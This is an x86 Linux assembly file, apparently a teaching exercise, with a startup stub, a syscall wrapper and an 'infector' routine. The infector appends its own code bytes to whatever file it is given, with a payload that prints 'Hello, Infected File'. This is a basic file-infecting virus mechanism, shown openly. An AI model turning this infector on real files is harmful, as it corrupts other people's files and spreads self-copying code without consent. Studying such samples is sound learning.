global _start
global system_call
global infection
global infector
extern main
section .rodata
    newline: db 10          ; newline character
    SYS_OPEN    equ 5
    SYS_WRITE   equ 4
    SYS_READ    equ 3
    O_RDONLY    equ 0
    O_RWC       equ 577     ; Write | Create | Trunc
    PERMS       equ 0644o
    
msg:    
    db "Hello, Infected File", 10
msg_end:

msg_len equ msg_end - msg
section .data
    Infile  dd 0            ; STDIN file descriptor (0)
    Outfile dd 1            ; STDOUT file descriptor (1)

section .text
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
infection:
    mov     eax, 4            ; sys_write
    mov     ebx, 1            ; fd = stdout
    mov     ecx, msg          ; buffer
    mov     edx, msg_len      ; length
    int     0x80
    ret

infector:
    push    ebp
    mov     ebp, esp

    mov     eax, 5            ; sys_open
    mov     ebx, [ebp + 8]    ; filename pointer
    mov     ecx, 0x401        ; flags = O_WRONLY(1) | O_APPEND(0x400) = 0x401
    mov     edx, 0            ; mode (not used for append)
    int     0x80
    ; return in eax (fd) or negative on error
    cmp     eax, 0
    jl      .inf_done         ; if error, just return

    ; save fd
    mov     ebx, eax          ; ebx = fd

    ; write(fd, code_start, code_size)
    mov     eax, 4            ; sys_write
    ; ebx already = fd
    mov     ecx, code_start   ; address of data to write
    mov     edx, code_end - code_start  ; size (assembled-time constant)
    int     0x80

    ; close(fd)
    mov     eax, 6            ; sys_close
    ; ebx already = fd
    int     0x80
.inf_done:
    mov     esp, ebp
    pop     ebp
    ret

code_end: